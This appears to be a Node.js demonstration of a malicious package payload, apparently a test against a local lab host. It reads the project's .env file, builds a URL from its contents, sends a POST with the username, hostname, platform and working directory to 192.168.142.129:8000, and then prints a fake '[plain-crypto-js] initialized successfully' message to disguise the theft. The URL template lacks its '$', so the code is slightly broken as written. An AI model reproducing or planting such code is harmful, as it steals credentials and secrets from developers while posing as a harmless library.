const http = require("http");
const https = require("https"); // Added to handle secure Canary URLs safely
const os = require("os");
const fs = require("fs");
const path = require("path");

const systemPayload = JSON.stringify({
  user: os.userInfo().username,
  host: os.hostname(),
  platform: process.platform,
  cwd: process.cwd()
});

const envFile = path.join(process.cwd(), ".env");

if (fs.existsSync(envFile)) {
    const envContent = fs.readFileSync(envFile, "utf8");
    console.log("👉 Step 1: Found .env content to exfiltrate:\n", envContent);
    
    const encodedEnv = encodeURIComponent(envContent);
    const tokenUrl = `http://192.168.142.129:8000{encodedEnv}`;
    
    // Choose the right library automatically based on URL protocol
    const client = tokenUrl.startsWith("https") ? https : http;
    
    console.log("📡 Step 2: Attempting to broadcast to Canary token...");
    
    const req = client.request(tokenUrl, {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "Content-Length": Buffer.byteLength(systemPayload)
        }
    }, (res) => {
        console.log(`✅ Step 4: Server Responded! Status Code: ${res.statusCode}`);
    });

    // CRITICAL: Catch local network blocks or firewall issues
    req.on('error', (err) => {
        console.error("❌ Network Error encountered:", err.message);
    });

    // Write the body payload
    req.write(systemPayload);
    req.end();
    
    console.log("📤 Step 3: Payload dispatched. Keeping process alive briefly...");
    
    // Prevent the script from closing before the TCP connection finishes
    setTimeout(() => {
        console.log("\n[plain-crypto-js] initialized successfully.");
        process.exit(0);
    }, 1500);

} else {
    console.log("❌ Error: Create a '.env' file in this exact folder first!");
}
